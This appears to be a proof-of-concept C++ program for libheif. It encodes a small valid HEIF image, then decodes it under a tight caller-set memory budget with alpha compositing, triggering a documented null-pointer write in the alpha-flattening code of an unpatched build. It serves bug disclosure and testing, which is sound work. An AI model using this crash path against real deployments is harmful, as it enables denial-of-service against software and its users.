// Residual null-pointer write in Op_flatten_alpha_plane::convert_colorspace.
//
// Builds a small, entirely valid RGBA image in memory, round-trips it through
// libheif's public encoder (uncompressed 'unci' codec) to get a normal HEIF
// file, then decodes it through the public heif_decode_image() API while
// compositing the alpha channel onto a solid background and requesting a
// YCbCr output -- exactly what heif-dec does when writing a JPEG from an
// alpha HEIC/AVIF. The only non-default part of the setup is a caller-supplied
// byte budget via the public heif_security_limits API (heif_total_memory),
// which a resource-constrained embedder is expected to tune for its own
// images; no malformed bytes are involved anywhere.
//
// At a budget that lets the initial decode succeed but is tight enough that
// one of the three freshly allocated R/G/B output planes cannot be allocated,
// Op_flatten_alpha_plane keeps compositing through the resulting null plane
// pointer and crashes. The real fix propagates that allocation error; this
// build does not.

#include <cstdio>
#include <cstdlib>
#include <cstdint>

#include "libheif/heif.h"

static heif_image* make_source_image(int w, int h)
{
  heif_image* image;
  heif_error err = heif_image_create(w, h, heif_colorspace_RGB, heif_chroma_444, &image);
  if (err.code) { fprintf(stderr, "create: %s\n", err.message); exit(1); }

  err = heif_image_add_plane(image, heif_channel_R, w, h, 8);
  if (err.code) { fprintf(stderr, "add R: %s\n", err.message); exit(1); }
  err = heif_image_add_plane(image, heif_channel_G, w, h, 8);
  if (err.code) { fprintf(stderr, "add G: %s\n", err.message); exit(1); }
  err = heif_image_add_plane(image, heif_channel_B, w, h, 8);
  if (err.code) { fprintf(stderr, "add B: %s\n", err.message); exit(1); }
  err = heif_image_add_plane(image, heif_channel_Alpha, w, h, 8);
  if (err.code) { fprintf(stderr, "add Alpha: %s\n", err.message); exit(1); }

  int stride;
  uint8_t* r = heif_image_get_plane(image, heif_channel_R, &stride);
  uint8_t* g = heif_image_get_plane(image, heif_channel_G, &stride);
  uint8_t* b = heif_image_get_plane(image, heif_channel_B, &stride);
  for (int j = 0; j < h; j++) {
    for (int i = 0; i < w; i++) {
      r[j * stride + i] = (uint8_t) (100 + i);
      g[j * stride + i] = (uint8_t) (60 + j);
      b[j * stride + i] = (uint8_t) (10 + i + j);
    }
  }

  uint8_t* a = heif_image_get_plane(image, heif_channel_Alpha, &stride);
  for (int j = 0; j < h; j++)
    for (int i = 0; i < w; i++)
      a[j * stride + i] = (uint8_t) (30 + i);

  return image;
}

static void generate_file(int w, int h, const char* path)
{
  heif_image* image = make_source_image(w, h);

  heif_context* ctx = heif_context_alloc();
  heif_encoder* encoder;
  heif_error err = heif_context_get_encoder_for_format(ctx, heif_compression_uncompressed, &encoder);
  if (err.code) { fprintf(stderr, "get encoder: %s\n", err.message); exit(1); }

  heif_encoding_options* options = heif_encoding_options_alloc();
  options->macOS_compatibility_workaround = false;

  heif_image_handle* out_handle;
  err = heif_context_encode_image(ctx, image, encoder, options, &out_handle);
  if (err.code) { fprintf(stderr, "encode: %s\n", err.message); exit(1); }

  err = heif_context_write_to_file(ctx, path);
  if (err.code) { fprintf(stderr, "write: %s\n", err.message); exit(1); }

  heif_image_handle_release(out_handle);
  heif_encoding_options_free(options);
  heif_encoder_release(encoder);
  heif_image_release(image);
  heif_context_free(ctx);
}

int main(int argc, char** argv)
{
  heif_init(nullptr);

  const char* path = (argc > 1) ? argv[1] : "/tmp/residual_alpha_poc.heic";
  uint64_t budget = (argc > 2) ? strtoull(argv[2], nullptr, 10) : 20000;

  generate_file(32, 32, path);

  heif_context* ctx = heif_context_alloc();
  heif_error err = heif_context_read_from_file(ctx, path, nullptr);
  if (err.code) { fprintf(stderr, "read: %s\n", err.message); return 1; }

  // A resource-constrained embedder tuning the documented total-memory budget
  // for its own typical image sizes. Nothing about the file itself is unusual.
  heif_security_limits* limits = heif_context_get_security_limits(ctx);
  limits->max_total_memory = budget;

  heif_image_handle* handle;
  err = heif_context_get_primary_image_handle(ctx, &handle);
  if (err.code) { fprintf(stderr, "get handle: %s\n", err.message); return 1; }

  heif_decoding_options* dec_options = heif_decoding_options_alloc();
  heif_color_conversion_options_ext* ext = heif_color_conversion_options_ext_alloc();
  ext->alpha_composition_mode = heif_alpha_composition_mode_solid_color;
  ext->background_red = 0xFFFF;
  ext->background_green = 0xFFFF;
  ext->background_blue = 0xFFFF;
  dec_options->color_conversion_options_ext = ext;

  // heif-dec's default when the output format cannot store alpha (e.g. writing
  // a JPEG from an alpha HEIC/AVIF): composite onto a background and decode to
  // YCbCr.
  heif_image* img = nullptr;
  err = heif_decode_image(handle, &img, heif_colorspace_YCbCr, heif_chroma_420, dec_options);

  fprintf(stderr, "[result] decode error code=%d sub=%d msg=%s\n", err.code, err.subcode, err.message);

  if (err.code == heif_error_Ok) {
    heif_image_release(img);
  }

  heif_color_conversion_options_ext_free(ext);
  heif_decoding_options_free(dec_options);
  heif_image_handle_release(handle);
  heif_context_free(ctx);

  return 0;
}
